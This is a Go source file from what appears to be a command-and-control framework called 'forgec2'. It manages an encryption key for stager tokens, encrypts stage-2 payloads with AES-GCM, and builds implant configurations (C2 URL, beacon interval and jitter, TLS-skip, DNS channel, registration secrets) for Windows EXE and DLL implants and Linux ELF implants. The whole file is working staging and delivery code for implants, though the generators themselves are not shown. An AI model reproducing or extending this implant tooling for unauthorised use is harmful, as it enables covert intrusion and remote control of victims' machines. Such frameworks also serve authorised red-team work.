package payload

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type StagerTokenData struct {
	ListenerID uint      `json:"listener_id"`
	Arch       string    `json:"arch"`
	OS         string    `json:"os"`
	Format     string    `json:"format"` // exe, dll, shellcode
	CreatedAt  time.Time `json:"created_at"`
	Nonce      string    `json:"nonce"`
}

type StagerConfig struct {
	ListenerID    uint
	C2URL         string
	Protocol      string // http, tcp, p2p (default "http")
	Architecture  string
	OS            string
	Format        string // exe, dll, shellcode
	UserAgent     string
	Profile       string
	SkipTLSVerify bool
	DNSDomain     string
	DNSServer     string
	BeaconKey     string // PSK used to derive registration auth (empty = no PSK auth)
	RegSecretID   string // v3 per-implant registration secret id
	RegSecret     string // v3 per-implant registration secret, base64
}

type StagerResult struct {
	Token       string // encrypted token (base64)
	TokenKeyHex string // 32-byte hex key for AES-256-GCM
	Stage2Path  string // path to generated stage-2 payload
	Stage2Size  int64
}

var (
	stagerKey         []byte
	stagerKeyExplicit bool
	stagerKeyOnce     sync.Once
	stagerKeyPath     = filepath.Join("data", "stager.key")
)

// SetStagerKeyFile overrides the on-disk location of the persisted stager key.
// It must be called before the first key initialization (e.g. at server
// startup with the configured data directory) to make key persistence
// independent of the process working directory.
func SetStagerKeyFile(path string) {
	if path != "" {
		stagerKeyPath = path
	}
}

// InitStagerKey loads the persisted stager key or generates a new one.
// A corrupted existing key (wrong length) is reported as an error instead of
// being silently overwritten, which would invalidate every previously issued
// stage token.
func InitStagerKey() error {
	var errOut error
	stagerKeyOnce.Do(func() {
		if stagerKeyExplicit {
			return
		}
		if data, err := os.ReadFile(stagerKeyPath); err == nil {
			if len(data) != 32 {
				errOut = fmt.Errorf("stager key file %s has invalid length %d (want 32); refusing to overwrite it", stagerKeyPath, len(data))
				return
			}
			stagerKey = data
			slog.Info("Stager key loaded from disk", "path", stagerKeyPath)
			return
		}
		key := make([]byte, 32)
		if _, err := rand.Read(key); err != nil {
			errOut = fmt.Errorf("crypto/rand.Read failed for stager key: %w", err)
			return
		}
		stagerKey = key
		if err := os.MkdirAll(filepath.Dir(stagerKeyPath), 0750); err != nil {
			slog.Error("Failed to create stager key directory", "path", filepath.Dir(stagerKeyPath), "error", err)
			return
		}
		if err := os.WriteFile(stagerKeyPath, stagerKey, 0640); err != nil {
			slog.Error("Failed to persist stager key; tokens will not survive a restart", "path", stagerKeyPath, "error", err)
			return
		}
		slog.Info("Stager key initialized and persisted", "path", stagerKeyPath)
	})
	return errOut
}

func GetStagerKey() []byte {
	if err := InitStagerKey(); err != nil {
		slog.Error("Stager key unavailable", "error", err)
		return nil
	}
	return stagerKey
}

// SetStagerKey overrides the in-memory stager key (used by tests and advanced
// deployments). An explicitly set key is authoritative and is never replaced
// by a disk load.
func SetStagerKey(key []byte) {
	if len(key) == 32 {
		stagerKey = key
		stagerKeyExplicit = true
	}
}

func EncryptStagerToken(data *StagerTokenData) (string, error) {
	payload, err := json.Marshal(data)
	if err != nil {
		return "", err
	}
	block, err := aes.NewCipher(stagerKey)
	if err != nil {
		return "", err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := aead.Seal(nil, nonce, payload, nil)
	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
}

func DecryptStagerToken(encoded string) (*StagerTokenData, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("invalid encoding: %w", err)
	}
	block, err := aes.NewCipher(stagerKey)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aead.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}
	var result StagerTokenData
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("invalid token data: %w", err)
	}
	return &result, nil
}

func EncryptStage2Payload(plaintext []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, aead.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ciphertext := aead.Seal(nil, nonce, plaintext, nil)
	return append(nonce, ciphertext...), nil
}

func DecryptStage2Payload(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := aead.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("payload too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("payload decryption failed: %w", err)
	}
	return plaintext, nil
}

func GenerateStagerStage2(cfg StagerConfig, outputDir string) (string, error) {
	proto := cfg.Protocol
	if proto == "" {
		proto = "http"
	}
	implantCfg := ImplantConfig{
		C2URL:         cfg.C2URL,
		Protocol:      proto,
		Interval:      10,
		Jitter:        20,
		UserAgent:     cfg.UserAgent,
		SkipTLSVerify: cfg.SkipTLSVerify,
		Filename:      "forgec2_stage2",
		Debug:         false,
		Profile:       cfg.Profile,
		ListenerID:    cfg.ListenerID,
		Architecture:  cfg.Architecture,
		DNSDomain:     cfg.DNSDomain,
		DNSServer:     cfg.DNSServer,
		BeaconKey:     cfg.BeaconKey,
		RegSecretID:   cfg.RegSecretID,
		RegSecret:     cfg.RegSecret,
	}

	if !filepath.IsAbs(outputDir) {
		abs, err := filepath.Abs(outputDir)
		if err == nil {
			outputDir = abs
		}
	}

	switch strings.ToLower(cfg.Format) {
	case "dll":
		return GenerateWindowsDLL(implantCfg, outputDir)
	case "shellcode", "raw":
		return "", fmt.Errorf("raw shellcode stager format is not implemented; use exe or dll")
	default:
		return GenerateWindowsEXE(implantCfg, outputDir)
	}
}

func GenerateStagerStage2Linux(cfg StagerConfig, outputDir string) (string, error) {
	proto := cfg.Protocol
	if proto == "" {
		proto = "http"
	}
	implantCfg := ImplantConfig{
		C2URL:         cfg.C2URL,
		Protocol:      proto,
		Interval:      10,
		Jitter:        20,
		UserAgent:     cfg.UserAgent,
		SkipTLSVerify: cfg.SkipTLSVerify,
		Filename:      "forgec2_stage2",
		Debug:         false,
		Profile:       cfg.Profile,
		ListenerID:    cfg.ListenerID,
		Architecture:  cfg.Architecture,
		BeaconKey:     cfg.BeaconKey,
		RegSecretID:   cfg.RegSecretID,
		RegSecret:     cfg.RegSecret,
	}

	if !filepath.IsAbs(outputDir) {
		abs, err := filepath.Abs(outputDir)
		if err == nil {
			outputDir = abs
		}
	}

	return GenerateLinuxELF(implantCfg, outputDir)
}

func GenerateStagerStage2Path(dataDir string, tokenID string) string {
	return filepath.Join(dataDir, "agents", "stager2_"+tokenID+".bin")
}

func GenerateStagerStage2EncryptedPath(dataDir string, tokenID string) string {
	return filepath.Join(dataDir, "agents", "stager2_"+tokenID+".enc")
}

func SaveStage2Encrypted(dataDir string, tokenID string, encrypted []byte) error {
	dir := filepath.Join(dataDir, "agents")
	if err := os.MkdirAll(dir, 0750); err != nil {
		return err
	}
	path := GenerateStagerStage2EncryptedPath(dataDir, tokenID)
	return os.WriteFile(path, encrypted, 0640)
}

func LoadStage2Encrypted(dataDir string, tokenID string) ([]byte, error) {
	path := GenerateStagerStage2EncryptedPath(dataDir, tokenID)
	return os.ReadFile(path)
}
